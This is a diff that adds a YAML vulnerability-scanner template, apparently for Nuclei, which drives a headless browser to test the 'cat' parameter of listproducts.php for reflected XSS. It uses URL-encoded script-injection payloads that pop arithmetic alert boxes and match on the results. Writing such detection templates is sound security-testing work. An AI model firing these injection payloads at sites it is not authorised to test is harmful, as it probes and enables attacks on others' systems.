@@ -1,0 +1,33 @@
+id: headless-reflected-xss-2
+
+info:
+  name: Reflected Headless XSS With Batteringram Attack
+  author: yar0v1t
+  severity: high
+  description: |
+     A cross-site scripting (XSS) vulnerability with headless mode and batteringram attack.
+
+headless:
+  - steps:
+      - args:
+          url: "{{BaseURL}}/listproducts.php?cat=1{{payload}}"
+        action: navigate
+
+      - action: waitdialog
+        name: reflected_cat_query
+
+    attack: batteringram
+    payloads:
+      payload:
+        - '%3C%2Fscript%3E%3Cscript%3Ealert%283%2B4%29%3C%2Fscript%3E'
+        - '%3C%2Fscript%3E%3Cscript%3Ealert%281%2B1%29%3C%2Fscript%3E'
+        - '%3C%2Fscript%3E%3Cscript%3Ealert%289%2B1%29%3C%2Fscript%3E'
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - reflected_cat_query == true
+          - contains(reflected_cat_query_message, '7') # 3+4
+          - contains(reflected_cat_query_message, '2') # 1+1
+          - contains(reflected_cat_query_message, '10') # 9+1
+        condition: or
